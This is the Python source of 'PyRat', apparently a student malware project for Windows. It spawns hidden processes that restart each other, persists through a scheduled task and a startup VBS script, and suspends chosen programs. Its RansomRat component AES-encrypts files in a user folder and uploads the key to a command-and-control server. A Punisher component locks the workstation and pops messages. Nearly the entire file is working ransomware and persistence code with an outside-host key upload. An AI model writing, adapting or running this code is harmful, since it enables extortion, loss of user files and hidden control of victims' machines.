import os
import sys
import time
import json
import socket
import ctypes
import psutil
import struct
import select
import base64
import signal
import subprocess
import requests
import hashlib
import random
import winreg
from Crypto import Random
from Crypto.Cipher import AES
from datetime import datetime
from io import StringIO
from abc import ABC, abstractmethod

ANY                 = "0.0.0.0"
LOCALHOST           = "localhost"
SOMAXCONN           = 128

PYRAT_TYPE_INDEX    = 1

STDOUT              = 0

def str2bool(string):
	if string == "True":
		return True
	else:
		return False

def log(text, file_path='log.txt'):
	with open(file_path, 'a+') as file_handler:
		file_handler.write(f'{datetime.now().time()}: {str(text)}\n')

def msg(text):
	subprocess.Popen(f'msg * "{text}"', shell=True)

class PyRatError(Exception):
	pass

class PyRat(ABC):
	PYRAT_CODE                  = os.path.abspath(__file__)
	CREATION_FLAGS              = subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS

	# C&C details
	SERVER_IP = '10.1.0.5'
	SERVER_PORT = '8000'
	API_PREFIX = f'http://{SERVER_IP}:{SERVER_PORT}'
	UPLOAD_API = f'{API_PREFIX}/upload'
	CONFIGURATION_API = f'{API_PREFIX}/config'
	API_COOKIES = {'login': 'ZWR3YXJk'}

	REG_FOLDER = r'Software\Microhard\HAHA'
	REG_DELETE_FOLDER = r'Software\Microhard'
	COUNT_NAME = 'justanumber'

	# Configuration if C&C is down
	DEFAULT_CONFIG = {	
	"QUARTERMASTER_PORT":               16998,

	"NEW_QUARTERMASTER_MATES":          3,
	"DEAD_MATE_MATES":                  2,

	"ITERATION_DELAY":                  0.5,
	"ENCRYPTION_DELAY":					10,

	"SCHEDULED_TASK_BOATSWAIN_NAME":    "TheOcean\\ScheduleBoatswain",
	"BAD_PROCESSES_NAMES":              ["notepad.exe"]
	}


	SEND_RECV_DELAY             = 0.001

	def sail(self):
		try:
			self.operate()
		except KeyboardInterrupt:
			pass

		self.leave()

	@abstractmethod
	def operate(self):
		pass
	
	@abstractmethod
	def leave(self):
		pass

	def getConfigurationFromServer(self):
		configuration_data = self.DEFAULT_CONFIG
		try:
			resp = requests.get(self.CONFIGURATION_API, cookies=self.API_COOKIES)
			configuration_data = json.loads(resp.text)
		except Exception as e:
			# log(e)
			pass
		finally:
			return configuration_data
			
	def challengeResponse(self, connection):
		sent_chal, recv_chal = self.sendAndRecvChallenge(connection)
		sent_resp, recv_resp = self.sendAndRecvResponse(connection, recv_chal)

		if not self.checkChallengeResponse(sent_chal, recv_resp):
			return False

		return True

	def sendAndRecvChallenge(self, connection):
		CHALLENGE = b"Arrrrg?"

		connection.send(CHALLENGE)
		time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
		other_challenge = connection.recv(len(CHALLENGE))

		return (CHALLENGE, other_challenge)

	def sendAndRecvResponse(self, connection, received_challenge):
		RESPONSE = b"Arrrrg!"

		connection.send(RESPONSE)
		time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
		other_response = connection.recv(len(RESPONSE))

		return (RESPONSE, other_response)

	def checkChallengeResponse(self, challenge, response):
		if response == b"Arrrrg!":
			return True

		return False

	def sendAndRecvPid(self, connection):
		connection.send(struct.pack(">L", os.getpid()))
		time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
		raw_pid = connection.recv(len(struct.pack(">L", 0)))
		return struct.unpack(">L", raw_pid)[0]

class Quartermaster(PyRat):
	QUARTERMASTER_EXE_PATH          		= os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Quartermaster.exe")
	STORM_PATH                      		= os.path.dirname(PyRat.PYRAT_CODE) + "\\storm"
	STARTUP_FOLDER							= f'{os.environ["ALLUSERSPROFILE"]}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
	STARTUP_BOATSWAIN_FILE					= f'{STARTUP_FOLDER}\\arg.vbs'
	STARTUP_BOATSWAIN_FILE_MD5				= '7382d02beca3999c196ea0052cc405e9'
	STARTUP_BOATSWAIN_FILE_ENCODED_CONTENT  = 'U2V0IG9TaGVsbCA9IENyZWF0ZU9iamVjdCAoIldzY3JpcHQuU2hlbGwiKSANCkRpbSBzdHJBcmdzDQpzdHJBcmdzID0gImNtZCAvYyAldXNlcnByb2ZpbGUlXGdpdFxmaW5hbF9tYWx3YXJlX3NlY3VyaXR5XHF1YXJ0ZXJtYXN0ZXIuZXhlICV1c2VycHJvZmlsZSVcZ2l0XGZpbmFsX21hbHdhcmVfc2VjdXJpdHlcUHlSYXQucHkiDQpvU2hlbGwuUnVuIHN0ckFyZ3MsIDAsIGZhbHNl'
	BLOCK_SIZE                      		= 1024

	@staticmethod
	def generateInstance(challenges_socket = None):
		# ctypes.windll.user32.MessageBoxW(0, "Generating quartermaster", "DEBUG", 0)
		if challenges_socket is None:
			return psutil.Popen(
				[Quartermaster.QUARTERMASTER_EXE_PATH, PyRat.PYRAT_CODE, Quartermaster.__name__, "False"], 
				creationflags=PyRat.CREATION_FLAGS,
				close_fds = True)
		
		quatermaster = psutil.Popen(
			[Quartermaster.QUARTERMASTER_EXE_PATH, PyRat.PYRAT_CODE, Quartermaster.__name__, "True"], 
			stdin=subprocess.PIPE, 
			creationflags=PyRat.CREATION_FLAGS,
			close_fds = True)

		try:
			shared_challenges_socket = challenges_socket.share(quatermaster.pid)
			quatermaster.communicate(input=base64.b64encode(shared_challenges_socket), timeout=0)

		except subprocess.TimeoutExpired:
			pass

		return quatermaster

	def __init__(self, is_challenges_socket_in_input = "False"):
		self.configuration = self.getConfigurationFromServer()

		self.challenges_socket = self.getChallengesSocket(str2bool(is_challenges_socket_in_input))
		if self.challenges_socket is None:
			exit(1)

		self.challenges_socket.setblocking(0)
		self.mates_pids = set()
		self.surgeon_pid = None
		
		print(f"A new quartermaster has been appointed! ({os.getpid()})")

	def operate(self):
		if self.isThereAStorm():
			# ctypes.windll.user32.MessageBoxW(0, "Storm Detected", "DEBUG", 0)
			return

		# ctypes.windll.user32.MessageBoxW(0, str(self.configuration["NEW_QUARTERMASTER_MATES"]), "DEBUG", 0)
		self.appointNewMates(self.configuration["NEW_QUARTERMASTER_MATES"])
		self.surgeon_pid = self.appointSurgeon(Surgeon.MODE_REMOVE)
		self.ransomrat_pid = self.appointRansomRat()
		self.punisher_pid = self.appointPunisher()

		iteration = 0

		while not self.isThereAStorm():
			current_pids = psutil.pids()
			self.watchMates(current_pids)
			self.watchBoatswains()
			self.watchSurgeon(current_pids)
			self.watchRansomRat(current_pids)
			self.watchPunisher(current_pids)
			self.acceptChallengingMates()

			time.sleep(self.configuration["ITERATION_DELAY"])

	def leave(self):
		self.dismissCrew()

		if self.challenges_socket is not None:
			self.challenges_socket.close()

		print(f"The quartermaster has left the ship. ({os.getpid()})")


	def getChallengesSocket(self, is_challenges_socket_in_input = False):
		try:
			if not is_challenges_socket_in_input:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.bind((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))
				sock.listen(SOMAXCONN)
				return sock

		except Exception:
			return None

		challenges_socket_base64 = input()
		shared_challenges_socket = base64.b64decode(challenges_socket_base64)
		return socket.fromshare(shared_challenges_socket)

	def acceptChallengingMates(self):
		try:
			while True:
				# Will raise BlockingIOError if none waiting
				new_connection, _ = self.challenges_socket.accept()

				# Check if the one that was connected is a Mate
				if not self.challengeResponse(new_connection):
					new_connection.close()
					continue

				mate_pid = self.sendAndRecvPid(new_connection)
				new_connection.close()

				# if self.new_configuration:
					# Resetting the mate so it will get the new configuration
					# self.sendLeaveCommand(mate_pid)
					# self.appointNewMates(1)

				# else:
					# self.mates_pids.add(mate_pid)
				self.mates_pids.add(mate_pid)

		except BlockingIOError:
			pass

	def watchMates(self, current_pids):
		mates_died = self.mates_pids - self.mates_pids.intersection(current_pids)
		
		for pid in mates_died:
			print(f"A mate has died! ({pid})")
			self.mates_pids.remove(pid)
		
		if mates_died:
			self.appointNewMates(self.configuration["DEAD_MATE_MATES"] * len(mates_died))

	def appointNewMates(self, number_of_new_mates):
		for i in range(number_of_new_mates):
			# ctypes.windll.user32.MessageBoxW(0, f"Mate {i} created", "DEBUG", 0)
			new_mate = Mate.generateInstance(os.getpid())
			self.mates_pids.add(new_mate.pid)

	def watchBoatswains(self):
		if not self.isScheduleBoatswainExists():
			self.appointScheduleBoatswain()
		if not self.isStartupBoatswainExists():
			self.appointStartupBoatswain()


	def isScheduleBoatswainExists(self):
		check_if_schedule_boatswain_exists_command = \
			f'schtasks /Query /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" 2> nul'

		is_schedule_boatswain_exists = subprocess.Popen(check_if_schedule_boatswain_exists_command, 
														shell=True, 
														stdout=subprocess.PIPE).communicate()[STDOUT]
		return bool(is_schedule_boatswain_exists)

	def appointScheduleBoatswain(self):
		create_schedule_boatswain_task_command = \
			f'schtasks /Create /F /SC MINUTE /MO 1 /NP /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" /TR "{self.QUARTERMASTER_EXE_PATH} {PyRat.PYRAT_CODE}" >nul 2>nul'
		subprocess.Popen(create_schedule_boatswain_task_command, shell=True)

		print(f'A schedule boatswain has been appointed! (Scheduled task {self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]})')

	def isStartupBoatswainExists(self):
		if os.path.isfile(self.STARTUP_BOATSWAIN_FILE):
			with open(self.STARTUP_BOATSWAIN_FILE, 'r') as file_handler:
				startup_content = file_handler.read()
			return hashlib.md5(startup_content.encode()).hexdigest == self.STARTUP_BOATSWAIN_FILE_MD5
		return False

	def appointStartupBoatswain(self):
		with open(self.STARTUP_BOATSWAIN_FILE, 'w') as file_handler:
			file_handler.write(base64.b64decode(self.STARTUP_BOATSWAIN_FILE_ENCODED_CONTENT).decode())

	def watchSurgeon(self, current_pids):
		if self.surgeon_pid not in current_pids:
			print(f"The surgeon has died! ({self.surgeon_pid})")
			self.surgeon_pid = self.appointSurgeon(Surgeon.MODE_REMOVE)

	def watchRansomRat(self, current_pids):
		if self.ransomrat_pid not in current_pids:
			print(f"The RansomRat has died! ({self.ransomrat_pid})")
			self.ransomrat_pid = self.appointRansomRat()

	def watchPunisher(self, current_pids):
		if self.punisher_pid not in current_pids:
			print(f"The punisher has died! ({self.punisher_pid})")
			self.punisher_pid = self.appointPunisher()

	def appointSurgeon(self, surgeon_mode):
		return Surgeon.generateInstance(os.getpid(), surgeon_mode).pid

	def appointRansomRat(self):
		return RansomRat.generateInstance(os.getpid()).pid

	def appointPunisher(self):
		return Punisher.generateInstance(os.getpid()).pid

	def isThereAStorm(self):
		if os.path.exists(self.STORM_PATH):
			print(f"Detected a storm... Today we shall not sail...")
			return True

		return False

	def dismissCrew(self):
		self.dismissBoatswains()
		self.dismissAllMates()
		self.dismissSurgeon()

	def dismissAllMates(self):
		for pid in self.mates_pids:
			self.sendLeaveCommand(pid)

	def dismissBoatswains(self):
		self.dismissScheduleBoatswain()
		self.dismissStartupBoatswain()

	def dismissScheduleBoatswain(self):
		delete_schedule_boatswain_task_command = \
			f'schtasks /Delete /F /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" >nul 2>nul'

		subprocess.Popen(delete_schedule_boatswain_task_command, shell=True)
		print(f'A schedule boatswain has left the ship. (Scheduled task {self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]})')

	def dismissStartupBoatswain(self):
		os.remove(self.STARTUP_BOATSWAIN_FILE)

	def dismissSurgeon(self):
		# Closing the surgeon and reattaching all the suspended processes by appointing a reattaching surgeon.
		self.sendLeaveCommand(self.surgeon_pid)
		self.appointSurgeon(Surgeon.MODE_REATTACH)

	def sendLeaveCommand(self, pid):
		try:
			os.kill(pid, signal.SIGINT)

		except (PermissionError, OSError):
			print("Permission error")
			pass

class Mate(PyRat):
	MATE_EXE_PATH               = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Mate.exe")

	@staticmethod
	def generateInstance(quartermaster_pid = None):
		if quartermaster_pid is not None:
			return psutil.Popen(
				[Mate.MATE_EXE_PATH, PyRat.PYRAT_CODE, Mate.__name__, str(quartermaster_pid)], 
				creationflags=PyRat.CREATION_FLAGS,
				close_fds = True)
		else:
			return psutil.Popen(
				[Mate.MATE_EXE_PATH, PyRat.PYRAT_CODE, Mate.__name__], 
				creationflags=PyRat.CREATION_FLAGS,
				close_fds = True)

	def __init__(self, quartermaster_pid = None):
		self.configuration = self.getConfigurationFromServer()

		if quartermaster_pid is not None:
			self.quartermaster_pid = int(quartermaster_pid)
		else:
			self.quartermaster_pid = self.getQuartermasterPid()

		print(f"A new mate has joined the team! ({os.getpid()})")

	def operate(self):
		while True:
			if self.quartermaster_pid not in psutil.pids():
				self.tryToAppointNewQuartermaster()

			time.sleep(self.configuration["ITERATION_DELAY"])

	def leave(self):
		print(f"A mate has left the ship. ({os.getpid()})")

	def tryToAppointNewQuartermaster(self):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			sock.bind((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))

		except OSError:
			# There is another quartermaster. Becoming quartermaster failed!
			sock.close()
			self.quartermaster_pid = self.getQuartermasterPid()
			return

		# Only one Mate will be able to reach this line (we use the bind as a mutex).
		print(f"The quartermaster has died! ({self.quartermaster_pid})")
		sock.listen(SOMAXCONN)
		Quartermaster.generateInstance(sock)
		sock.close()

		self.quartermaster_pid = self.getQuartermasterPid()

	def getQuartermasterPid(self):
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
			try:
				connection.connect((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))

			except ConnectionRefusedError:
				raise PyRatError("There is no quartermaster!")

			if not self.challengeResponse(connection):
				# The port is taken but it is not a quartermaster on the other side...
				raise PyRatError("A non quartermaster has taken the port!")

			return self.sendAndRecvPid(connection)

class Surgeon(PyRat):
	SURGEON_EXE_PATH    = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Surgeon.exe")
	BAD_PROCESS_NAMES   = ["notepad.exe"]
	SUSPENDED           = "stopped"

	MODE_REMOVE         = "remove"
	MODE_REATTACH       = "reattach"

	@staticmethod
	def generateInstance(quartermaster_pid, mode):
		return psutil.Popen(
			[Surgeon.SURGEON_EXE_PATH, PyRat.PYRAT_CODE, Surgeon.__name__, str(quartermaster_pid), mode], 
			creationflags=PyRat.CREATION_FLAGS,
			close_fds = True)

	def __init__(self, quartermaster_pid, mode):
		self.configuration = self.getConfigurationFromServer()

		if mode not in [self.MODE_REMOVE, self.MODE_REATTACH]:
			raise PyRatError("Not a valid surgeon mode")

		self.quartermaster_pid = int(quartermaster_pid)
		self.reg = RegistryInterface(self.REG_FOLDER, self.REG_DELETE_FOLDER)
		self.mode = mode
		self.start_time = time.time()

		print(f"A new surgeon has joined the team! ({os.getpid()})")

	def operate(self):
		if self.mode == self.MODE_REMOVE:
			while self.quartermaster_pid in psutil.pids():
				self.removeLimbs()
				time.sleep(self.configuration["ITERATION_DELAY"])
		
		elif self.mode == self.MODE_REATTACH:
			self.reattachLimbs()

	def leave(self):
		print(f"The surgeon has left the ship. ({os.getpid()})")

	def removeLimbs(self):
		for process in psutil.process_iter():
			if process.name() in self.configuration["BAD_PROCESSES_NAMES"] and \
			   process.create_time() > self.start_time and \
			   process.status() != self.SUSPENDED:

				process.suspend()
				self.reg.incrementInt(self.COUNT_NAME)

	def reattachLimbs(self):
		for process in psutil.process_iter():
			if process.name() in self.configuration["BAD_PROCESSES_NAMES"] and \
			   process.status() == self.SUSPENDED:
			   
				process.resume()

class RansomRat(PyRat):
	RANSOMRAT_EXE_PATH = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "RansomRat.exe")
	FOLDER_TO_DECRYPT = f'{os.environ["USERPROFILE"]}\\Documents\\encrypt'


	@staticmethod
	def generateInstance(quartermaster_pid):
		return psutil.Popen(
			[RansomRat.RANSOMRAT_EXE_PATH, PyRat.PYRAT_CODE, RansomRat.__name__, str(quartermaster_pid)], 
			creationflags=PyRat.CREATION_FLAGS,
			close_fds = True)

	def __init__(self, quartermaster_pid):
		self.configuration = self.getConfigurationFromServer()

		self.quartermaster_pid = int(quartermaster_pid)

		self.key = RansomRat.generateAesKey()
		self.uploadKey()

		self.aes = AESCipher(self.key)

		print(f"A new RansomRat has joined the team! ({os.getpid()})")

	def operate(self):
		files_to_encrypt = RansomRat.getFilesToEncrypt()

		while self.quartermaster_pid in psutil.pids():
			if not files_to_encrypt:
				files_to_encrypt = RansomRat.getFilesToEncrypt()

			else:
				current_file = random.choice(files_to_encrypt)
				files_to_encrypt.remove(current_file)
				self.encryptFile(current_file)

			time.sleep(self.configuration["ENCRYPTION_DELAY"])
		
	def leave(self):
		print(f"The RansomRat has left the ship. ({os.getpid()})")

	def uploadKey(self):
		key_file_path = f'C:\\windows\\temp\\{os.environ["COMPUTERNAME"]}_key'
		with open(key_file_path, 'wb') as file_handler:
			file_handler.write(self.key)

		key_file_handle = open(key_file_path, 'rb')
		files = {'upload': key_file_handle}

		try:
			resp = requests.post(self.UPLOAD_API, files=files, cookies=self.API_COOKIES)
			if 'An error has occured. Error: File exists.' in resp.text:
				self.key = self.generateFallbackAesKey()
			server_up = resp.status_code == 200
		except Exception as e:
			# log(e)
			server_up = False

		key_file_handle.close()
		os.remove(key_file_path)

		return server_up

	def encryptFile(self, file_path):
		with open(file_path, 'rb') as file_handler:
			unencrypted = file_handler.read()
		encrypted = self.aes.encrypt(str(unencrypted))

		with open(file_path, 'wb') as file_handler:
			file_handler.write(bytes(encrypted))

	@staticmethod
	def generateAesKey():
		return os.urandom(16)

	@staticmethod
	def generateFallbackAesKey():
		return hashlib.sha1().hexdigest()[:16].encode('utf8')

	@staticmethod
	def getFilesToEncrypt():
		all_files = [os.path.join(path, name) for path, subdirs, files in os.walk(RansomRat.FOLDER_TO_DECRYPT) for name in files]
		return [f for f in all_files if not RansomRat.isFileEncrypted(f)]

	@staticmethod
	def isFileEncrypted(file_path):
		with open(file_path, 'rb') as file_handler:
			content = file_handler.read()
		try:
			base64.b16decode(content)
			return True
		except:
			return False


class Punisher(PyRat):
	PUNISHER_EXE_PATH = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Punisher.exe")
	REBOOT_MESSAGE = 'this is not yet a reboot'
	

	@staticmethod
	def generateInstance(quartermaster_pid):
		return psutil.Popen(
			[Punisher.PUNISHER_EXE_PATH, PyRat.PYRAT_CODE, Punisher.__name__, str(quartermaster_pid)], 
			creationflags=PyRat.CREATION_FLAGS,
			close_fds = True)

	def __init__(self, quartermaster_pid, count_name=PyRat.COUNT_NAME):
		self.configuration = self.getConfigurationFromServer()

		self.quartermaster_pid = int(quartermaster_pid)

		self.count_name = count_name
		self.reg = RegistryInterface(self.REG_FOLDER, self.REG_DELETE_FOLDER)

		self.count_punishment = {
			1:	self.firstPunishment,
			2:	self.secondPunishment,
			3:	self.thirdPunishment,
			4:	self.fourthPunishment,
			5:	self.finalPunishment
		}

		self.executed_punishments = []

		log(f"A new Punisher has joined the team! ({os.getpid()})")

	def operate(self):
		while self.quartermaster_pid in psutil.pids():
			count = self.reg.getRegValue(self.count_name)
			if type(count) == bool:
				log('type is bool')
				self.reg.setRegValue(self.count_name, 0)
				self.finalPunishment()
			elif type(count) == int and count in self.count_punishment.keys():
				punishment = self.count_punishment[count]
				if punishment not in self.executed_punishments:
					punishment()
					self.executed_punishments.append(punishment)
					log('executed punishment')
			else:
				pass

			time.sleep(self.configuration["ITERATION_DELAY"])
	
	@staticmethod
	def firstPunishment():
		msg('Good morning!')
	
	@staticmethod
	def secondPunishment():
		msg('Damn! Not Cool')
		for i in range(5):
			subprocess.run('cmd /c tree C:', shell=True)
	
	@staticmethod
	def thirdPunishment():
		msg("Oh no you didn't!!")
		ctypes.windll.user32.LockWorkStation()
	
	@staticmethod	
	def fourthPunishment():
		msg('Thats the last warning!')
		# ctypes.windll.user32.ExitWindowsEx(0, 1)
		
	@staticmethod
	def finalPunishment():
		msg(Punisher.REBOOT_MESSAGE)
		# Reboot computer

	def leave(self):
		self.reg.deleteRegFolder()
		log(f"The Punisher has left the ship. ({os.getpid()})")


class RegistryInterface(object):

	def __init__(self, folder, delete_folder, hive="HKEY_CURRENT_USER"):
		self.folder = folder
		self.hive = hive
		self.delete_command = f'reg delete "{hive}\\{delete_folder}" /f'
		log(self.delete_command)

	def setRegValue(self, name, value):
		value_type = RegistryInterface.determineValueType(value)
		try:
			winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.folder)
			registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.folder, 0, 
										   winreg.KEY_WRITE)
			winreg.SetValueEx(registry_key, name, 0, value_type, value)
			winreg.CloseKey(registry_key)
			return True
		except WindowsError as e:
			log(e)
			return False

	def getRegValue(self, name):
		try:
			registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.folder, 0,
										   winreg.KEY_READ)
			value, regtype = winreg.QueryValueEx(registry_key, name)
			winreg.CloseKey(registry_key)
			return value
		except WindowsError as e:
			log(e)
			return False

	def deleteRegFolder(self):
		try:
			output = subprocess.run(self.delete_command, shell=True, stdout=subprocess.PIPE).stdout.decode()
			log(f'reg delete output: {output}')
			return output == 'The operation completed successfully.\r\r\n'
		except WindowsError as e:
			log(e)
			return False

	def incrementInt(self, name):
		self.setRegValue(name, self.getRegValue(name) + 1)

	@staticmethod
	def determineValueType(value):
		if type(value) == int:
			return winreg.REG_DWORD
		elif type(value) == str:
			return winreg.REG_SZ
		return winreg.REG_NONE

class AESCipher(object):

	def __init__(self, key): 
		self.bs = AES.block_size
		self.key = key

	def encrypt(self, raw):
		raw = self._pad(raw)
		iv = Random.new().read(AES.block_size)
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		return base64.b16encode(iv + cipher.encrypt(raw.encode()))

	def decrypt(self, enc):
		enc = base64.b16decode(enc)
		iv = enc[:AES.block_size]
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

	def _pad(self, s):
		return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

	@staticmethod
	def _unpad(s):
		return s[:-ord(s[len(s)-1:])]

def main(argv):
	if len(argv) <= PYRAT_TYPE_INDEX:
		# This is the main run. We want to create a Quartermaster and exit.
		print(Quartermaster.generateInstance())
		return

	try:
		# ctypes.windll.user32.MessageBoxW(0, "something created", "DEBUG", 0)
		# Generating the wanted PyRat
		pyrat = globals()[argv[PYRAT_TYPE_INDEX]](*argv[PYRAT_TYPE_INDEX + 1 :])
		pyrat.sail()

	except KeyboardInterrupt:
		pass

	except Exception as e:
		ctypes.windll.user32.MessageBoxW(0, "An unexpected exception was raised:\n{}".format(e), "A PyRat fell", 0)

if __name__ == "__main__":
	main(sys.argv)
